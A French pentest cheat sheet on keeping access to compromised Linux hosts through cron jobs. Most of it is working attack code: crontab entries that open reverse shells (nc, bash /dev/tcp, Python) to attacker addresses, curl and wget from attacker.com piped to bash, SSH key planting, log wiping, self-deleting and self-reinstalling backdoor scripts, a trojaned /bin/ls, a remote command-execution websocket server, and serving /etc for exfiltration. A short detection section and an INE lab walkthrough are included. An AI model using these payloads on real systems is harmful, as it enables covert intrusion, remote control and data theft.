# Cron Jobs - Cheat Sheet Persistance Pentest

## Introduction
Les cron jobs sont un mécanisme de planification de tâches sous Unix/Linux qui peuvent être exploités pour maintenir la persistance sur un système compromis. Cette technique permet d'exécuter du code malveillant de manière récurrente et discrète.

## Concepts de Base

### Structure d'une Crontab
```
* * * * * /path/to/command
│ │ │ │ │
│ │ │ │ └─── Jour de la semaine (0-7, dimanche = 0 ou 7)
│ │ │ └───── Mois (1-12)
│ │ └─────── Jour du mois (1-31)
│ └───────── Heure (0-23)
└─────────── Minute (0-59)
```

### Emplacements des Fichiers Cron
- **Crontab utilisateur** : `/var/spool/cron/crontabs/[username]`
- **Crontab système** : `/etc/crontab`
- **Répertoires système** : `/etc/cron.d/`, `/etc/cron.daily/`, `/etc/cron.hourly/`, `/etc/cron.monthly/`, `/etc/cron.weekly/`

## Techniques de Reconnaissance

### Énumération des Cron Jobs Existants
```bash
# Lister les cron jobs de l'utilisateur actuel
crontab -l

# Lister les cron jobs d'un utilisateur spécifique (si privilèges suffisants)
crontab -u username -l

# Examiner les cron jobs système
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*
```

### Surveillance des Processus Cron
```bash
# Surveiller les processus liés à cron
ps aux | grep cron

# Vérifier les logs de cron
tail -f /var/log/cron
tail -f /var/log/syslog | grep CRON
```

## Techniques d'Établissement de Persistance

### 1. Modification de Crontab Utilisateur
```bash
# Ajouter une tâche dans la crontab de l'utilisateur actuel
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.hidden/backdoor.sh") | crontab -

# Méthode alternative avec echo
echo "*/10 * * * * nc -e /bin/bash attacker_ip 4444" | crontab -
```

### 2. Injection dans les Cron Jobs Système
```bash
# Ajouter une entrée dans /etc/crontab (nécessite root)
echo "*/15 * * * * root /tmp/malware.sh" >> /etc/crontab

# Créer un fichier dans /etc/cron.d/
echo "*/5 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'" > /etc/cron.d/backdoor
```

### 3. Placement de Scripts Malveillants
```bash
# Dans les répertoires de cron périodiques
cp backdoor.sh /etc/cron.daily/update-system
chmod +x /etc/cron.daily/update-system

# Script déguisé en tâche légitime
cp reverse_shell.sh /etc/cron.hourly/logrotate-cleanup
chmod 755 /etc/cron.hourly/logrotate-cleanup
```

## Exemples de Payloads

### Reverse Shell Bash
```bash
# Crontab entry
*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'

# Script file (/tmp/rev.sh)
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```

### Python Reverse Shell
```bash
# Crontab entry
*/10 * * * * python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Téléchargement et Exécution
```bash
# Télécharger et exécuter un payload
*/15 * * * * curl -s http://attacker.com/payload.sh | bash
*/15 * * * * wget -q -O - http://attacker.com/payload.sh | bash
```

### Persistence avec SSH
```bash
# Ajouter une clé SSH (si ~/.ssh/ existe)
*/30 * * * * echo "ssh-rsa AAAAB3NzaC1yc2E..." >> ~/.ssh/authorized_keys
```

## Techniques de Camouflage

### 1. Noms de Fichiers Trompeurs
```bash
# Utiliser des noms de processus légitimes
cp backdoor.sh /tmp/systemd-update
cp malware /usr/local/bin/apt-daily-upgrade
```

### 2. Suppression de Logs
```bash
# Nettoyer les traces dans les logs
*/60 * * * * sed -i '/backdoor/d' /var/log/syslog
```

### 3. Scripts Auto-Destructeurs
```bash
#!/bin/bash
# Script qui se supprime après exécution
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
rm $0
```

### 4. Vérification de Contexte
```bash
#!/bin/bash
# Ne s'exécuter que si certaines conditions sont réunies
if [ "$(whoami)" = "target_user" ] && [ -f "/tmp/.execute" ]; then
    nc -e /bin/bash 192.168.1.100 4444
fi
```

## Gestion des Erreurs et Discrétion

### Redirection des Sorties
```bash
# Rediriger stdout et stderr vers /dev/null
*/5 * * * * /tmp/backdoor.sh > /dev/null 2>&1

# Rediriger vers un fichier log caché
*/10 * * * * /tmp/malware.sh >> /tmp/.hidden_log 2>&1
```

### Test de Connectivité
```bash
#!/bin/bash
# Vérifier la connectivité avant d'établir la connexion
if ping -c 1 192.168.1.100 > /dev/null 2>&1; then
    nc -e /bin/bash 192.168.1.100 4444
fi
```

## Persistence Avancée

### Cron Job qui Recrée d'Autres Backdoors
```bash
# Script qui maintient plusieurs méthodes de persistance
*/20 * * * * /bin/bash -c 'if ! crontab -l | grep -q "backdoor"; then echo "*/5 * * * * /tmp/backdoor.sh" | crontab -; fi'
```

### Modification de Binaires Système
```bash
# Remplacer un binaire système appelé par cron
cp /bin/ls /bin/ls.bak
cp malicious_ls /bin/ls
```

## Détection et Contre-mesures

### Surveillance pour Blue Team
```bash
# Monitorer les changements de crontab
auditctl -w /etc/crontab -p wa -k crontab_changes
auditctl -w /var/spool/cron/ -p wa -k user_crontab_changes

# Vérifier l'intégrité des fichiers cron
find /etc/cron* -type f -exec stat {} \; | grep Modify
```

### Signes d'Infection
- Nouvelles entrées dans `crontab -l`
- Fichiers récents dans `/etc/cron.*`
- Processus suspects s'exécutant périodiquement
- Connexions réseau récurrentes
- Fichiers cachés avec des permissions d'exécution

## Nettoyage des Traces

### Suppression des Cron Jobs
```bash
# Supprimer toutes les crontabs de l'utilisateur
crontab -r

# Supprimer une ligne spécifique
crontab -l | grep -v "backdoor" | crontab -

# Nettoyer les fichiers système (root requis)
rm /etc/cron.d/backdoor
sed -i '/malware/d' /etc/crontab
```

## Conseils de Sécurité Opérationnelle

### Bonnes Pratiques
1. **Tester localement** : Toujours tester les cron jobs sur un système de test
2. **Timing intelligent** : Éviter les heures de forte activité système
3. **Randomisation** : Varier les intervalles d'exécution
4. **Monitoring** : Surveiller les logs pour détecter les erreurs
5. **Fallback** : Prévoir plusieurs méthodes de persistance

### Intervalles Discrets
```bash
# Éviter les intervalles trop réguliers
7,23,41 * * * * /tmp/backdoor.sh  # Minutes irrégulières
0 2,8,14,20 * * * /tmp/malware.sh  # Heures variées
```

## Exemples Complets

### Script de Persistance Avancée
```bash
#!/bin/bash
# /tmp/.system_update.sh

# Vérifications de sécurité
if [ ! -f "/tmp/.execute_flag" ]; then exit 0; fi
if [ "$(ps aux | grep -c sshd)" -lt 2 ]; then exit 0; fi

# Payload principal
if nc -z 192.168.1.100 4444 2>/dev/null; then
    bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
fi

# Auto-maintenance
if ! crontab -l 2>/dev/null | grep -q "system_update"; then
    (crontab -l 2>/dev/null; echo "*/13 * * * * /tmp/.system_update.sh > /dev/null 2>&1") | crontab -
fi
```

### Crontab d'Installation
```bash
# Installation initiale (à exécuter une seule fois)
(crontab -l 2>/dev/null; echo "*/13 * * * * /tmp/.system_update.sh > /dev/null 2>&1") | crontab -
touch /tmp/.execute_flag
chmod +x /tmp/.system_update.sh
```

## Cas Pratique - T1168: Local Job Scheduling

### Scénario de Lab INE
Ce cas pratique montre l'utilisation des cron jobs pour maintenir l'accès à un système via un serveur HTTP Python.

#### Étape 1 : Reconnaissance
```bash
# Vérifier la connectivité
ping -c 4 demo.ine.local

# Scanner les ports ouverts
nmap demo.ine.local
```

#### Étape 2 : Accès Initial
```bash
# Connexion SSH avec identifiants connus
ssh student@demo.ine.local
# Mot de passe: password
```

#### Étape 3 : Vérification des Services
```bash
# Vérifier les processus en cours (notamment cron)
ps -eaf | grep cron
```

#### Étape 4 : Création de la Persistance HTTP
```bash
# Créer un cron job pour servir les fichiers via HTTP
echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron

# Installer la crontab
crontab -i cron

# Vérifier l'installation
crontab -l
```

#### Étape 5 : Test de la Persistance
```bash
# Se déconnecter puis se reconnecter
exit
ssh student@demo.ine.local

# Supprimer le fichier de contrôle
rm wait

# La session SSH se termine mais le serveur HTTP continue
```

#### Étape 6 : Vérification de la Persistance
```bash
# Scanner pour vérifier que le port 8000 est ouvert
nmap -p- demo.ine.local

# Accéder au serveur HTTP
curl demo.ine.local:8000
curl demo.ine.local:8000/flag.txt
```

### Variantes du Serveur HTTP Persistant

#### Python 3
```bash
# Pour Python 3
echo "* * * * * cd /home/student/ && python3 -m http.server 8000" > cron
crontab cron
```

#### Serveur avec Authentification Simple
```bash
# Script avec basic auth
cat << 'EOF' > /tmp/auth_server.py
#!/usr/bin/env python3
import http.server
import socketserver
from http.server import BaseHTTPRequestHandler
import base64

class AuthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        auth_header = self.headers.get('Authorization')
        if auth_header and auth_header == 'Basic c3R1ZGVudDpwYXNzd29yZA==':  # student:password
            return http.server.SimpleHTTPRequestHandler.do_GET(self)
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Basic realm="Protected"')
        self.end_headers()

with socketserver.TCPServer(("", 8000), AuthHandler) as httpd:
    httpd.serve_forever()
EOF

chmod +x /tmp/auth_server.py
echo "* * * * * cd /home/student/ && python3 /tmp/auth_server.py" | crontab -
```

#### Serveur avec Upload
```bash
# Serveur permettant l'upload de fichiers
cat << 'EOF' > /tmp/upload_server.py
#!/usr/bin/env python3
import http.server
import socketserver
from http.server import BaseHTTPRequestHandler
import cgi
import os

class UploadHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/upload':
            form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD': 'POST'})
            fileitem = form['file']
            if fileitem.filename:
                with open('/tmp/' + fileitem.filename, 'wb') as f:
                    f.write(fileitem.file.read())
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'File uploaded successfully')
            return
        return http.server.SimpleHTTPRequestHandler.do_POST(self)
    
    def do_GET(self):
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

os.chdir('/home/student/')
with socketserver.TCPServer(("", 8000), UploadHandler) as httpd:
    httpd.serve_forever()
EOF

chmod +x /tmp/upload_server.py
echo "* * * * * python3 /tmp/upload_server.py" | crontab -
```

### Applications Pratiques

#### Exfiltration de Données
```bash
# Serveur pour exfiltrer des données sensibles
echo "* * * * * cd /etc/ && python3 -m http.server 8001 --bind 0.0.0.0" | crontab -
```

#### Tunnel de Communication
```bash
# Serveur WebSocket pour communication bidirectionnelle
cat << 'EOF' > /tmp/websocket_server.py
#!/usr/bin/env python3
import asyncio
import websockets
import subprocess

async def handle_client(websocket, path):
    async for message in websocket:
        try:
            result = subprocess.run(message, shell=True, capture_output=True, text=True)
            await websocket.send(f"STDOUT:\n{result.stdout}\nSTDERR:\n{result.stderr}")
        except Exception as e:
            await websocket.send(f"ERROR: {str(e)}")

start_server = websockets.serve(handle_client, "0.0.0.0", 8765)
asyncio.get_event_loop().run_until_complete(start_server)
asyncio.get_event_loop().run_forever()
EOF

chmod +x /tmp/websocket_server.py
echo "* * * * * python3 /tmp/websocket_server.py" | crontab -
```

### Détection du Serveur HTTP Persistant

#### Signes d'Activité Suspecte
```bash
# Ports inhabituels ouverts
netstat -tulnp | grep :8000
ss -tulnp | grep :8000

# Processus Python suspects
ps aux | grep -E "(SimpleHTTPServer|http\.server)"

# Connexions réseau actives
lsof -i :8000
```

#### Contre-mesures
```bash
# Identifier et arrêter le serveur
pkill -f "SimpleHTTPServer"
pkill -f "http.server"

# Supprimer les cron jobs suspects
crontab -l | grep -v "SimpleHTTPServer\|http.server" | crontab -

# Surveiller les modifications de crontab
auditctl -w /var/spool/cron/crontabs/ -p wa -k crontab_monitor
```

---

**Note de Sécurité** : Ces techniques sont destinées uniquement à des fins éducatives et de test de sécurité autorisé. L'utilisation malveillante de ces informations est illégale et non éthique.